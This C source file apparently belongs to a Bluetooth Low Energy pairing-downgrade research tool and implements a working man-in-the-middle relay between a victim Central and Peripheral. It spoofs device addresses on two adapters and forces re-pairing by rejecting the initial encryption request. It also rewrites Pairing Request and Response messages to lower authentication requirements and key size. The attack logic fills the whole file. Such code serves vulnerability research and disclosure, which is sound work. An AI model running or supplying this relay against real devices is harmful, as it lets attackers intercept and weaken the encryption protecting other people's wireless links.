// ========================================
//  nom du fichier: blerp_mitm_relay.c
//  description courte: Implementation of the BLERP single-channel MitM
//  relay. See blerp_mitm_relay.h for the contract.
//  dernière modification : 2026-10-10
//  auteur: GitHub/@gGaToRr
// ========================================

#define _GNU_SOURCE

#include "blerp_mitm_relay.h"
#include "mgmt.h"
#include "../ui.h"
#include "smp.h" // SMP_CODE_* opcodes
#include "../wire/hci_wire.h"
#include "../wire/hci_user_channel.h"

#include <errno.h>
#include <poll.h>
#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#include <unistd.h>

#define SMP_CID_VAL 0x0006

// True for the two feature-negotiation opcodes. See blerp_mitm_relay.h.
bool blerp_relay_should_rewrite(uint8_t smp_opcode) {
    return smp_opcode == SMP_CODE_PAIRING_REQUEST ||
           smp_opcode == SMP_CODE_PAIRING_RESPONSE;
}

// Bring `fd` up as a connectable Peripheral under `spoof_addr` (or the
// controller's own public address if `spoof_addr` is all-zero), and wait up
// to `wait_conn_ms` for a Central to connect. Mirrors blerp_run_pi()'s
// connection setup. Returns 0 and fills *out_handle on success, -1 on
// timeout (adv_data build failure is treated as a timeout: nothing to
// advertise, nobody will connect).
static int link_as_peripheral(int fd, const uint8_t spoof_addr[6],
                              const char *adv_name, uint16_t appearance,
                              int wait_conn_ms, uint16_t *out_handle) {
    hci_user_channel_send_cmd(fd, HCI_OP_RESET, NULL, 0);
    usleep(80000);

    uint8_t le_mask[8] = { 0xff, 0x1f, 0x0a, 0x03, 0, 0, 0, 0 };
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_EVENT_MASK, le_mask, 8);

    uint8_t own_addr_type = 0x00; // Public
    static const uint8_t zero_addr[6] = {0};
    if (memcmp(spoof_addr, zero_addr, 6) != 0) {
        hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_RANDOM_ADDR, spoof_addr, 6);
        own_addr_type = 0x01; // Random
        printf("  [*] hci-side (fake Bob) address spoofed to: %02X:%02X:%02X:%02X:%02X:%02X\n",
               spoof_addr[5], spoof_addr[4], spoof_addr[3],
               spoof_addr[2], spoof_addr[1], spoof_addr[0]);
    }

    uint8_t adv_raw[31];
    size_t adv_len = blerp_build_adv_data(adv_name, appearance, adv_raw, sizeof adv_raw);
    uint8_t adv_data[32];
    memset(adv_data, 0, sizeof adv_data);
    adv_data[0] = (uint8_t)adv_len;
    memcpy(&adv_data[1], adv_raw, adv_len);

    uint8_t adv_params[15] = {
        0x30, 0x00, 0x30, 0x00, // 30ms interval
        0x00,                   // ADV_IND
        own_addr_type,
        0x00, 0, 0, 0, 0, 0, 0,
        0x07, 0x00
    };
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_PARAMS, adv_params, sizeof adv_params);
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_DATA, adv_data, sizeof adv_data);

    uint8_t enable = 0x01;
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &enable, 1);

    struct timeval start, now;
    gettimeofday(&start, NULL);
    while (1) {
        gettimeofday(&now, NULL);
        long elapsed = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_usec - start.tv_usec) / 1000;
        int remaining = wait_conn_ms - (int)elapsed;
        if (remaining <= 0) {
            uint8_t off = 0x00;
            hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_ADV_ENABLE, &off, 1);
            return -1;
        }

        struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
        if (poll(&pfd, 1, remaining) <= 0) continue;

        uint8_t pkt[1024];
        ssize_t n = read(fd, pkt, sizeof pkt);
        if (n < 8 || pkt[0] != HCI_EVENT_PKT || pkt[1] != HCI_EV_LE_META) continue;
        uint8_t sub = pkt[3];
        if ((sub == HCI_SUBEVT_LE_CONN_COMPLETE || sub == HCI_SUBEVT_LE_CONN_COMPLETE_ENH) &&
            pkt[4] == 0x00 && pkt[7] == 0x01) {
            *out_handle = (uint16_t)((pkt[5] | (pkt[6] << 8)) & 0x0fff);
            return 0;
        }
    }
}

// Connect `fd` to `target_addr` under `spoof_addr` (or the controller's own
// public address if `spoof_addr` is all-zero), waiting up to `wait_conn_ms`.
// Mirrors blerp_run_ci()'s connection setup. Returns 0 and fills
// *out_handle on success, -1 on timeout (the pending connection attempt is
// cancelled before returning).
static int link_as_central(int fd, const uint8_t spoof_addr[6],
                           const uint8_t target_addr[6], uint8_t target_type,
                           int wait_conn_ms, uint16_t *out_handle) {
    hci_user_channel_send_cmd(fd, HCI_OP_RESET, NULL, 0);
    usleep(80000);

    uint8_t le_mask[8] = { 0xff, 0x1f, 0x0a, 0x03, 0, 0, 0, 0 };
    hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_EVENT_MASK, le_mask, 8);

    uint8_t own_addr_type = 0x00; // Public
    static const uint8_t zero_addr[6] = {0};
    if (memcmp(spoof_addr, zero_addr, 6) != 0) {
        hci_user_channel_send_cmd(fd, HCI_OP_LE_SET_RANDOM_ADDR, spoof_addr, 6);
        own_addr_type = 0x01; // Random
        printf("  [*] hci-side (fake Alice) address spoofed to: %02X:%02X:%02X:%02X:%02X:%02X\n",
               spoof_addr[5], spoof_addr[4], spoof_addr[3],
               spoof_addr[2], spoof_addr[1], spoof_addr[0]);
    }

    uint8_t conn_params[25];
    memset(conn_params, 0, sizeof conn_params);
    conn_params[0] = 0x60; conn_params[1] = 0x00; // Scan interval 60ms
    conn_params[2] = 0x60; conn_params[3] = 0x00; // Scan window 60ms (100% duty cycle)
    conn_params[4] = 0x00; // Filter policy
    conn_params[5] = (target_type == 2) ? 0x01 : 0x00; // Peer address type
    memcpy(&conn_params[6], target_addr, 6);
    conn_params[12] = own_addr_type;
    conn_params[13] = 0x18; conn_params[14] = 0x00; // Min interval 30ms
    conn_params[15] = 0x28; conn_params[16] = 0x00; // Max interval 50ms
    conn_params[17] = 0x00; conn_params[18] = 0x00; // Latency
    conn_params[19] = 0xf4; conn_params[20] = 0x01; // Supervision timeout 5000ms

    hci_user_channel_send_cmd(fd, HCI_OP_LE_CREATE_CONN, conn_params, 25);

    struct timeval start, now;
    gettimeofday(&start, NULL);
    while (1) {
        gettimeofday(&now, NULL);
        long elapsed = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_usec - start.tv_usec) / 1000;
        int remaining = wait_conn_ms - (int)elapsed;
        if (remaining <= 0) {
            hci_user_channel_send_cmd(fd, HCI_OP_LE_CREATE_CONN_CANCEL, NULL, 0);
            return -1;
        }

        struct pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
        if (poll(&pfd, 1, remaining) <= 0) continue;

        uint8_t pkt[1024];
        ssize_t n = read(fd, pkt, sizeof pkt);
        if (n < 8 || pkt[0] != HCI_EVENT_PKT || pkt[1] != HCI_EV_LE_META) continue;
        uint8_t sub = pkt[3];
        if ((sub == HCI_SUBEVT_LE_CONN_COMPLETE || sub == HCI_SUBEVT_LE_CONN_COMPLETE_ENH) &&
            pkt[4] == 0x00) {
            *out_handle = (uint16_t)((pkt[5] | (pkt[6] << 8)) & 0x0fff);
            return 0;
        }
    }
}

// Mutable state threaded through the relay loop, bundled so the per-packet
// handler below takes one pointer instead of half a dozen.
struct relay_state {
    struct blerp_relay_report *rep;
    bool random_from_alice; // Alice's Pairing Random has been relayed to Bob
    bool random_from_bob;   // Bob's Pairing Random has been relayed to Alice
    bool stop;              // a terminal event (failure/disconnect) happened
};

// Handle one ACL packet read from `from_fd`, relaying it (rewriting the
// feature-negotiation PDU this direction carries, if any) to `to_fd`/
// `to_handle`. `rewrite_preq` selects the direction: true for Alice->Bob
// (rewrites a Pairing Request), false for Bob->Alice (rewrites a Pairing
// Response). `tag` is "Alice" or "Bob", for the trace.
static void relay_acl(const uint8_t *pkt, ssize_t n, int to_fd, uint16_t to_handle,
                      bool rewrite_preq, const char *tag,
                      const struct blerp_attack_config *cfg,
                      struct relay_state *st) {
    if (n < 10) return;
    uint16_t cid = (uint16_t)(pkt[7] | (pkt[8] << 8));
    if (cid != SMP_CID_VAL) return;
    uint8_t op = pkt[9];
    const uint8_t *smp = &pkt[9];
    uint16_t smp_len = (uint16_t)(n - 9);

    if (op == SMP_CODE_PAIRING_FAILED) {
        st->rep->pairing_failed = true;
        st->rep->fail_reason = (n >= 11) ? pkt[10] : 0;
        printf("  %s[!] %s sent Pairing Failed (reason 0x%02x); relaying and stopping.%s\n",
               UI_RED, tag, st->rep->fail_reason, UI_RESET);
        hci_user_channel_send_acl(to_fd, to_handle, SMP_CID_VAL, smp, smp_len);
        st->stop = true;
        return;
    }

    if (blerp_relay_should_rewrite(op) && smp_len == 7) {
        uint8_t rewritten[7];
        int rc;
        if (rewrite_preq) {
            rc = blerp_rewrite_preq(smp, rewritten, cfg->downgraded_authreq, cfg->downgraded_keysize);
            if (rc == 7) {
                st->rep->alice_authreq = smp[3];
                st->rep->alice_keysize = smp[4];
                st->rep->bob_authreq = rewritten[3];
                st->rep->bob_keysize = rewritten[4];
                st->rep->preq_relayed = true;
            }
        } else {
            rc = blerp_rewrite_pres(smp, rewritten, cfg->downgraded_authreq, cfg->downgraded_keysize);
            if (rc == 7) st->rep->pres_relayed = true;
        }
        printf("  [SMP] %s AuthReq=0x%02x/KeySize=%d -> forwarded AuthReq=0x%02x/KeySize=%d (%s, V3/V4/V6)\n",
               tag, smp[3], smp[4], rc == 7 ? rewritten[3] : smp[3], rc == 7 ? rewritten[4] : smp[4],
               rewrite_preq ? "Pairing Request" : "Pairing Response");
        hci_user_channel_send_acl(to_fd, to_handle, SMP_CID_VAL, rc == 7 ? rewritten : smp, 7);
        return;
    }

    if (op == SMP_CODE_PAIRING_RANDOM) {
        if (rewrite_preq) st->random_from_alice = true; else st->random_from_bob = true;
        if (st->random_from_alice && st->random_from_bob) {
            st->rep->pairing_completed = true;
            printf("  %s[+] Pairing Random relayed both ways: Alice and Bob now share a key "
                   "negotiated at the parameters Charlie let through.%s\n", UI_GREEN, UI_RESET);
        }
    }

    // Default: relay byte-for-byte (public key, confirm, random, Phase 3
    // key distribution, ...). This is the policy described in Fig. 6: only
    // the feature-negotiation PDUs are tampered with.
    hci_user_channel_send_acl(to_fd, to_handle, SMP_CID_VAL, smp, smp_len);
}

// Run the single-channel MitM relay. See blerp_mitm_relay.h for the contract.
int blerp_run_single_channel_mitm(const struct blerp_attack_config *cfg,
                                  struct blerp_relay_report *rep) {
    if (!cfg || !rep) return -1;
    memset(rep, 0, sizeof *rep);

    static const uint8_t zero_addr[6] = {0};
    if (memcmp(cfg->target_addr, zero_addr, 6) == 0) {
        fprintf(stderr, "  [-] Single-channel MitM requires the victim Peripheral's address: it is "
                         "both the connection target and the fake-Peripheral spoofed identity.\n");
        errno = EINVAL;
        return -1;
    }
    if (cfg->dev_id == cfg->dev_id_sec) {
        fprintf(stderr, "  [-] Single-channel MitM requires two distinct HCI adapters "
                         "(-i and -j must differ; got hci%d for both).\n", cfg->dev_id);
        errno = EINVAL;
        return -1;
    }

    int fd_alice = hci_user_channel_open(cfg->dev_id);
    if (fd_alice < 0) {
        int err = errno;
        fprintf(stderr, "  [-] hci%d : %s\n", cfg->dev_id, hci_user_channel_strerror(err));
        errno = err;
        return -1;
    }

    printf("  [*] Advertising as the victim Peripheral on hci%d. Awaiting the victim Central...\n",
           cfg->dev_id);
    uint16_t handle_alice = 0;
    if (link_as_peripheral(fd_alice, cfg->target_addr, cfg->adv_name, cfg->appearance,
                           cfg->wait_conn_ms, &handle_alice) < 0) {
        fprintf(stderr, "  [-] No victim Central connected within the timeout.\n");
        hci_user_channel_close(fd_alice, cfg->dev_id);
        return 0;
    }
    rep->linked_alice = true;
    printf("  %s[+] Victim Central connected (handle 0x%04x).%s\n", UI_GREEN, handle_alice, UI_RESET);

    int fd_bob = hci_user_channel_open(cfg->dev_id_sec);
    if (fd_bob < 0) {
        int err = errno;
        fprintf(stderr, "  [-] hci%d : %s\n", cfg->dev_id_sec, hci_user_channel_strerror(err));
        hci_user_channel_close(fd_alice, cfg->dev_id);
        errno = err;
        return -1;
    }

    printf("  [*] Connecting to the victim Peripheral on hci%d, impersonating the victim Central...\n",
           cfg->dev_id_sec);
    uint16_t handle_bob = 0;
    if (link_as_central(fd_bob, cfg->spoof_addr, cfg->target_addr, cfg->target_type,
                        cfg->wait_conn_ms, &handle_bob) < 0) {
        fprintf(stderr, "  [-] Could not reach the victim Peripheral within the timeout.\n");
        hci_user_channel_close(fd_bob, cfg->dev_id_sec);
        hci_user_channel_close(fd_alice, cfg->dev_id);
        return 0;
    }
    rep->linked_bob = true;
    printf("  %s[+] Connected to the victim Peripheral (handle 0x%04x).%s\n", UI_GREEN, handle_bob, UI_RESET);
    printf("  %s[*] MitM position established. Relaying SMP; Pairing Request/Response will be "
           "downgraded to AuthReq=0x%02x, KeySize=%d.%s\n",
           UI_PINK, cfg->downgraded_authreq, cfg->downgraded_keysize, UI_RESET);

    // V5: reject Alice's initial encryption request, nudging her toward
    // re-pairing (same mechanic as blerp_run_pi).
    if (cfg->reject_enc) {
        struct timeval start, now;
        gettimeofday(&start, NULL);
        while (1) {
            gettimeofday(&now, NULL);
            long elapsed = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_usec - start.tv_usec) / 1000;
            int rem = 3000 - (int)elapsed;
            if (rem <= 0) break;

            struct pollfd pfd = { .fd = fd_alice, .events = POLLIN, .revents = 0 };
            if (poll(&pfd, 1, rem) <= 0) break;

            uint8_t pkt[512];
            ssize_t n = read(fd_alice, pkt, sizeof pkt);
            if (n >= 4 && pkt[0] == HCI_EVENT_PKT && pkt[1] == HCI_EV_LE_META &&
                pkt[3] == HCI_SUBEVT_LE_LTK_REQUEST) {
                uint8_t neg[2] = { (uint8_t)(handle_alice & 0xff), (uint8_t)(handle_alice >> 8) };
                hci_user_channel_send_cmd(fd_alice, HCI_OP_LE_LTK_NEG_REPLY, neg, sizeof neg);
                rep->enc_rejected = true;
                printf("  %s[*] Alice's encryption request rejected (LL_REJECT_IND, V5).%s\n",
                       UI_PINK, UI_RESET);
                break;
            }
        }
    }

    // Main relay loop: watch both links, forward every SMP PDU, rewriting
    // only the feature-negotiation ones. Runs until a terminal event
    // (failure, disconnect, completed pairing) or cfg->wait_react_ms elapses.
    struct relay_state st = { .rep = rep };
    struct timeval start, now;
    gettimeofday(&start, NULL);

    while (!st.stop) {
        gettimeofday(&now, NULL);
        long elapsed = (now.tv_sec - start.tv_sec) * 1000 + (now.tv_usec - start.tv_usec) / 1000;
        int remaining = cfg->wait_react_ms - (int)elapsed;
        if (remaining <= 0) break;

        struct pollfd pfds[2] = {
            { .fd = fd_alice, .events = POLLIN, .revents = 0 },
            { .fd = fd_bob,   .events = POLLIN, .revents = 0 },
        };
        if (poll(pfds, 2, remaining) <= 0) break;

        if (pfds[0].revents & POLLIN) {
            uint8_t pkt[1024];
            ssize_t n = read(fd_alice, pkt, sizeof pkt);
            if (n >= 2 && pkt[0] == HCI_ACLDATA_PKT) {
                relay_acl(pkt, n, fd_bob, handle_bob, /*rewrite_preq=*/true, "Alice", cfg, &st);
            } else if (n >= 2 && pkt[0] == HCI_EVENT_PKT && pkt[1] == HCI_EV_DISCONN_COMPL) {
                printf("  [-] Victim Central disconnected.\n");
                st.stop = true;
            }
        }
        if (!st.stop && (pfds[1].revents & POLLIN)) {
            uint8_t pkt[1024];
            ssize_t n = read(fd_bob, pkt, sizeof pkt);
            if (n >= 2 && pkt[0] == HCI_ACLDATA_PKT) {
                relay_acl(pkt, n, fd_alice, handle_alice, /*rewrite_preq=*/false, "Bob", cfg, &st);
            } else if (n >= 2 && pkt[0] == HCI_EVENT_PKT && pkt[1] == HCI_EV_DISCONN_COMPL) {
                printf("  [-] Victim Peripheral disconnected.\n");
                st.stop = true;
            }
        }
        if (rep->pairing_completed) break;
    }

    uint8_t disc_a[3] = { (uint8_t)(handle_alice & 0xff), (uint8_t)(handle_alice >> 8), 0x13 };
    uint8_t disc_b[3] = { (uint8_t)(handle_bob & 0xff), (uint8_t)(handle_bob >> 8), 0x13 };
    hci_user_channel_send_cmd(fd_alice, HCI_OP_DISCONNECT, disc_a, 3);
    hci_user_channel_send_cmd(fd_bob, HCI_OP_DISCONNECT, disc_b, 3);
    usleep(20000);
    uint8_t off = 0x00;
    hci_user_channel_send_cmd(fd_alice, HCI_OP_LE_SET_ADV_ENABLE, &off, 1);

    hci_user_channel_close(fd_bob, cfg->dev_id_sec);
    hci_user_channel_close(fd_alice, cfg->dev_id);
    return 0;
}
